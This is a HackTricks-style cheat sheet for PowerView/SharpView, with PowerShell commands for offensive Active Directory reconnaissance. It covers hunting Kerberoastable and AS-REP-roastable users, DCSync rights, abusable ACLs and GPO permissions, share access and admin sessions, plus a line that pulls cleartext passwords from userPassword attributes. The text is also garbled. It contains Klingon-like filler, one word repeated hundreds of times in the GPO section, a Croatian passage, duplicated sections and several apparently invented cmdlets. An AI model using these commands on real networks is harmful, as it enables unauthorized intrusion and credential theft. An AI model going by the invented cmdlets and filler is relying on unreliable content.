# PowerView/SharpView

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a> <strong>DaH jImej</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **Do you work in a cybersecurity company**? **Do you want to see your company advertised in HackTricks**? **or do you want to have access to the latest version of the PEASS or download HackTricks in PDF**? **Check the SUBSCRIPTION PLANS**!
* **Discover The PEASS Family**, **our collection of exclusive NFTs**
* **Get the official PEASS & HackTricks swag**
* **Join the** [**üí¨**](https://emojipedia.org/speech-balloon/) **Discord group** or the **telegram group** or **follow** me on **Twitter** üê¶**@carlospolopm**.
* **Share your hacking tricks by submitting PRs to the hacktricks repo and hacktricks-cloud repo**.

</details>

The most up-to-date version of PowerView will always be in the dev branch of PowerSploit: [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

[**SharpView**](https://github.com/tevora-threat/SharpView) is a .NET port of [**PowerView**](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

### Quick enumeration
```powershell
Get-NetDomain #Basic domain info
#User info
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN #Kerberoastable users
#Groups info
Get-NetGroup | select samaccountname, admincount, description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
#Computers
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrainusered | select samaccountname #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
#Shares
Find-DomainShare -CheckShareAccess #Search readable shares
#Domain trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
#LHF
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess
#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter -CheckAccess
#Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
```
### Domain info

#### Get-Domain
```
Get-Domain
```

#### Get-DomainController
```
Get-DomainController
```

#### Get-DomainControllerPasswordReplicationPolicy
```
Get-DomainControllerPasswordReplicationPolicy
```

#### Get-DomainControllerPasswordReplicationPolicyUsage
```
Get-DomainControllerPasswordReplicationPolicyUsage
```

#### Get-DomainControllerPasswordReplicationPolicyChange
```
Get-DomainControllerPasswordReplicationPolicyChange
```

#### Get-DomainControllerPasswordReplicationPolicyChange -Identity <DCName>
```
Get-DomainControllerPasswordReplicationPolicyChange -Identity <DCName>
```

#### Get-DomainControllerPasswordReplicationPolicyChange -Identity <DCName> -Domain <DomainName>
```
Get-DomainControllerPasswordReplicationPolicyChange -Identity <DCName> -Domain <DomainName>
```

#### Get-DomainControllerPasswordReplicationPolicyChange -Identity <DCName> -Domain <DomainName> -Time <Time>
```
Get-DomainControllerPasswordReplicationPolicyChange -Identity <DCName> -Domain <DomainName> -Time <Time>
```

#### Get-DomainControllerPasswordReplicationPolicyChange -Identity <DCName> -Domain <DomainName> -Time <Time> -Verbose
```
Get-DomainControllerPasswordReplicationPolicyChange -Identity <DCName> -Domain <DomainName> -Time <Time> -Verbose
```

#### Get-DomainControllerPasswordReplicationPolicyChange -Identity <DCName> -Domain <DomainName> -Time <Time> -Verbose | Select-Object -ExpandProperty Changes
```
Get-DomainControllerPasswordReplicationPolicyChange -Identity <DCName> -Domain <DomainName> -Time <Time> -Verbose | Select-Object -ExpandProperty Changes
```
```powershell
# Domain Info
Get-Domain #Get info about the current domain
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID

# Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
Get-DomainPolicyData | select -ExpandProperty SystemAccess #Same as previous
(Get-DomainPolicy).PrivilegeRights #Check your privileges
Get-DomainPolicyData # Same as Get-DomainPolicy

# Domain Controller
Get-DomainController | select Forest, Domain, IPAddress, Name, OSVersion | fl # Get specific info of current domain controller
Get-NetDomainController -Domain mydomain.local #Get all ifo of specific domain Domain Controller

# Get Forest info
Get-ForestDomain
```
### Users, Groups, Computers & OUs

### Users, Groups, Computers & OUs

#### Get-NetUser

```powershell
Get-NetUser
```

This command retrieves information about all the users in the current domain.

#### Get-NetGroup

```powershell
Get-NetGroup
```

This command retrieves information about all the groups in the current domain.

#### Get-NetComputer

```powershell
Get-NetComputer
```

This command retrieves information about all the computers in the current domain.

#### Get-NetOU

```powershell
Get-NetOU
```

This command retrieves information about all the Organizational Units (OUs) in the current domain.

#### Get-DomainUser

```powershell
Get-DomainUser
```

This command retrieves information about all the users in the current domain.

#### Get-DomainGroup

```powershell
Get-DomainGroup
```

This command retrieves information about all the groups in the current domain.

#### Get-DomainComputer

```powershell
Get-DomainComputer
```

This command retrieves information about all the computers in the current domain.

#### Get-DomainOU

```powershell
Get-DomainOU
```

This command retrieves information about all the Organizational Units (OUs) in the current domain.
```powershell
# Users
## Get usernames and their groups
Get-DomainUser -Properties name, MemberOf | fl
## Get-DomainUser and Get-NetUser are kind of the same
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select samaccountname, description, pwdlastset, logoncount, badpwdcount #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount  #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter
# Get users with reversible encryption (PWD in clear text with dcsync)
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

# Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto #Constrained Resource Delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation
# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
# Users with PASSWD_NOTREQD set in the userAccountControl means that the user is not subject to the current password policy
## Users with this flag might have empty passwords (if allowed) or shorter passwords
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

#Groups
Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName
## Get-DomainGroup is similar to Get-NetGroup
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl #Search admin grups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} #Get ObjectACLs by sid
Get-NetGPOGroup #Get restricted groups

# Computers
Get-DomainComputer -Properties DnsHostName # Get all domain maes of computers
## Get-DomainComputer is kind of the same as Get-NetComputer
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups

#OU
Get-DomainOU -Properties Name | sort -Property Name #Get names of OUs
Get-DomainOU "Servers" | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name} #Get all computers inside an OU (Servers in this case)
## Get-DomainOU is kind of the same as Get-NetOU
Get-NetOU #Get Organization Units
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} #Get all computers inside an OU (StudentMachines in this case)
```
### Logon je Sessions

#### `Get-NetLoggedon`

`Get-NetLoggedon` je cmdlet koji se koristi za prikazivanje informacija o korisnicima koji su trenutno prijavljeni na raƒçunalu. Ovaj cmdlet prikazuje korisniƒçka imena, domene, SID-ove i druge relevantne informacije o prijavljenim korisnicima.

Primjer upotrebe:

```powershell
Get-NetLoggedon
```

#### `Get-NetSession`

`Get-NetSession` je cmdlet koji se koristi za prikazivanje informacija o aktivnim sesijama na raƒçunalu. Ovaj cmdlet prikazuje korisniƒçka imena, domene, SID-ove, IP adrese i druge relevantne informacije o aktivnim sesijama.

Primjer upotrebe:

```powershell
Get-NetSession
```

#### `Get-NetSession -ComputerName <raƒçunalo>`

`Get-NetSession` takoƒëer podr≈æava opciju `-ComputerName` koja omoguƒáuje prikazivanje informacija o aktivnim sesijama na odreƒëenom raƒçunalu u mre≈æi.

Primjer upotrebe:

```powershell
Get-NetSession -ComputerName <raƒçunalo>
```

#### `Get-NetSession -ComputerName <raƒçunalo> -Username <korisniƒçko_ime>`

`Get-NetSession` takoƒëer podr≈æava opciju `-Username` koja omoguƒáuje prikazivanje informacija o aktivnim sesijama odreƒëenog korisnika na odreƒëenom raƒçunalu u mre≈æi.

Primjer upotrebe:

```powershell
Get-NetSession -ComputerName <raƒçunalo> -Username <korisniƒçko_ime>
```

#### `Get-NetSession -ComputerName <raƒçunalo> -Domain <domena>`

`Get-NetSession` takoƒëer podr≈æava opciju `-Domain` koja omoguƒáuje prikazivanje informacija o aktivnim sesijama na odreƒëenom raƒçunalu u odreƒëenoj domeni.

Primjer upotrebe:

```powershell
Get-NetSession -ComputerName <raƒçunalo> -Domain <domena>
```

#### `Get-NetSession -ComputerName <raƒçunalo> -Domain <domena> -Username <korisniƒçko_ime>`

`Get-NetSession` takoƒëer podr≈æava opcije `-Domain` i `-Username` koje omoguƒáuju prikazivanje informacija o aktivnim sesijama odreƒëenog korisnika na odreƒëenom raƒçunalu u odreƒëenoj domeni.

Primjer upotrebe:

```powershell
Get-NetSession -ComputerName <raƒçunalo> -Domain <domena> -Username <korisniƒçko_ime>
```

#### `Get-NetSession -ComputerName <raƒçunalo> -Domain <domena> -Username <korisniƒçko_ime> | Remove-NetSession`

`Remove-NetSession` je cmdlet koji se koristi za prekid aktivne sesije na odreƒëenom raƒçunalu. Mo≈æe se koristiti u kombinaciji s `Get-NetSession` cmdletom kako bi se prona≈°le i prekinule sesije odreƒëenog korisnika na odreƒëenom raƒçunalu u odreƒëenoj domeni.

Primjer upotrebe:

```powershell
Get-NetSession -ComputerName <raƒçunalo> -Domain <domena> -Username <korisniƒçko_ime> | Remove-NetSession
```
```powershell
Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)
```
### Group Policy Object - GPOs

**Qa'pla'!** QaStaHvIS **GPO** Daq **ghap** **'ejwI'** **ghap** **'ejwI'** **'ej** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI'** **'ejwI
```powershell
#GPO
Get-DomainGPO | select displayName #Check the names for info
Get-NetGPO #Get all policies with details
Get-NetGPO | select displayname #Get the names of the policies
Get-NetGPO -ComputerName <servername> #Get the policy applied in a computer
gpresult /V #Get current policy

# Get who can create new GPOs
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=invented,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Enumerate permissions for GPOs where users with RIDs of > 1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Get permissions a user/group has over any GPO
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# COnvert GPO GUID to name
Get-GPO -Guid 18E5A689-E67F-90B2-1953-198ED4A7F532

# Transform SID to name
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126

# Get GPO of an OU
Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'

# Returns all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences.
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType

# Enumerates the machines where a specific domain user/group is a member of a specific local group.
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
```
**ACL (Access Control List)** is a mechanism used to define and manage permissions on various resources in a computer system. It specifies which users or groups have access to specific objects and what actions they can perform on those objects.

In the context of hacking, understanding and exploiting ACLs can be beneficial for gaining unauthorized access to sensitive information or performing malicious activities within a system.

To learn more about exploiting permissions over GPOs (Group Policy Objects) and ACLs, refer to the following resource:

[acl-persistence-abuse](../active-directory-methodology/acl-persistence-abuse/)
```powershell
#Get ACLs of an object (permissions of other objects over the indicated one)
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs

#Other way to get ACLs of an object
$sid = Convert-NameToSid <username/group>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

#Get permissions of a file
Get-PathAcl -Path "\\dc.mydomain.local\sysvol"

#Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs

#Check if any of the interesting permissions founds is realated to a username/group
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}

#Get special rights over All administrators in domain
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights
```
### Qa'leghmey je 'ej qachDaq

#### Get-NetShare

The `Get-NetShare` cmdlet can be used to enumerate shared files and folders on a target system. It provides information such as the share name, local path, and description.

```powershell
Get-NetShare
```

#### Get-NetFileServer

The `Get-NetFileServer` cmdlet can be used to retrieve information about file servers in the current domain. This includes details such as the server name, domain, and operating system.

```powershell
Get-NetFileServer
```

#### Get-NetFileShare

The `Get-NetFileShare` cmdlet can be used to enumerate file shares on a target system. It provides information such as the share name, local path, and description.

```powershell
Get-NetFileShare
```

#### Get-NetSession

The `Get-NetSession` cmdlet can be used to retrieve information about active sessions on a target system. This includes details such as the username, computer name, and session type.

```powershell
Get-NetSession
```

#### Get-NetSessionComputer

The `Get-NetSessionComputer` cmdlet can be used to retrieve information about the computers involved in active sessions on a target system. This includes details such as the computer name, username, and session type.

```powershell
Get-NetSessionComputer
```

#### Get-NetSessionUser

The `Get-NetSessionUser` cmdlet can be used to retrieve information about the users involved in active sessions on a target system. This includes details such as the username, computer name, and session type.

```powershell
Get-NetSessionUser
```

#### Get-NetLoggedon

The `Get-NetLoggedon` cmdlet can be used to retrieve information about users who are currently logged on to a target system. This includes details such as the username, logon time, and logon type.

```powershell
Get-NetLoggedon
```

#### Get-NetSharePermission

The `Get-NetSharePermission` cmdlet can be used to retrieve information about the permissions set on a shared file or folder. This includes details such as the share name, trustee name, and access rights.

```powershell
Get-NetSharePermission -ShareName 'ShareName'
```

#### Get-NetFilePermission

The `Get-NetFilePermission` cmdlet can be used to retrieve information about the permissions set on a file. This includes details such as the file path, trustee name, and access rights.

```powershell
Get-NetFilePermission -Path 'FilePath'
```

#### Get-NetFileServer

The `Get-NetFileServer` cmdlet can be used to retrieve information about file servers in the current domain. This includes details such as the server name, domain, and operating system.

```powershell
Get-NetFileServer
```

#### Get-NetFileShare

The `Get-NetFileShare` cmdlet can be used to enumerate file shares on a target system. It provides information such as the share name, local path, and description.

```powershell
Get-NetFileShare
```

#### Get-NetSession

The `Get-NetSession` cmdlet can be used to retrieve information about active sessions on a target system. This includes details such as the username, computer name, and session type.

```powershell
Get-NetSession
```

#### Get-NetSessionComputer

The `Get-NetSessionComputer` cmdlet can be used to retrieve information about the computers involved in active sessions on a target system. This includes details such as the computer name, username, and session type.

```powershell
Get-NetSessionComputer
```

#### Get-NetSessionUser

The `Get-NetSessionUser` cmdlet can be used to retrieve information about the users involved in active sessions on a target system. This includes details such as the username, computer name, and session type.

```powershell
Get-NetSessionUser
```

#### Get-NetLoggedon

The `Get-NetLoggedon` cmdlet can be used to retrieve information about users who are currently logged on to a target system. This includes details such as the username, logon time, and logon type.

```powershell
Get-NetLoggedon
```

#### Get-NetSharePermission

The `Get-NetSharePermission` cmdlet can be used to retrieve information about the permissions set on a shared file or folder. This includes details such as the share name, trustee name, and access rights.

```powershell
Get-NetSharePermission -ShareName 'ShareName'
```

#### Get-NetFilePermission

The `Get-NetFilePermission` cmdlet can be used to retrieve information about the permissions set on a file. This includes details such as the file path, trustee name, and access rights.

```powershell
Get-NetFilePermission -Path 'FilePath'
```
```powershell
Get-NetFileServer #Search file servers. Lot of users use to be logged in this kind of servers
Find-DomainShare -CheckShareAccess #Search readable shares
Find-InterestingDomainShareFile #Find interesting files, can use filters
```
### Domain Trust

#### Introduction

Domain trust is a relationship established between two domains that allows users from one domain to access resources in the other domain. This trust relationship is important for seamless authentication and resource sharing across domains.

#### Types of Domain Trusts

There are several types of domain trusts that can be established between domains. Some common types include:

- One-way trust: In this type of trust, Domain A trusts Domain B, but Domain B does not trust Domain A. This means that users from Domain B can access resources in Domain A, but users from Domain A cannot access resources in Domain B.

- Two-way trust: In this type of trust, both Domain A and Domain B trust each other. This allows users from both domains to access resources in the other domain.

- Forest trust: This type of trust is established between two Active Directory forests. It allows users from one forest to access resources in the other forest.

#### Trust Authentication

When a user from one domain tries to access resources in another domain, trust authentication comes into play. Trust authentication involves verifying the identity of the user and granting appropriate access based on the trust relationship between the domains.

#### Trust Transitivity

Trust transitivity refers to the ability of a trust relationship to extend beyond two domains. If Domain A trusts Domain B and Domain B trusts Domain C, then Domain A can also trust Domain C. This allows users from Domain A to access resources in Domain C.

#### Trust Security

Domain trust can have security implications, as it allows users from one domain to access resources in another domain. It is important to carefully manage and secure domain trust relationships to prevent unauthorized access and potential security breaches.

#### Conclusion

Domain trust is a crucial aspect of domain management, enabling seamless authentication and resource sharing across domains. Understanding the different types of domain trusts and their implications is essential for effective domain administration and security.
```powershell
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-DomainTrust #Same
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
Get-DomainTrustMapping #Enumerate also all the trusts

Get-ForestDomain # Get basic forest info
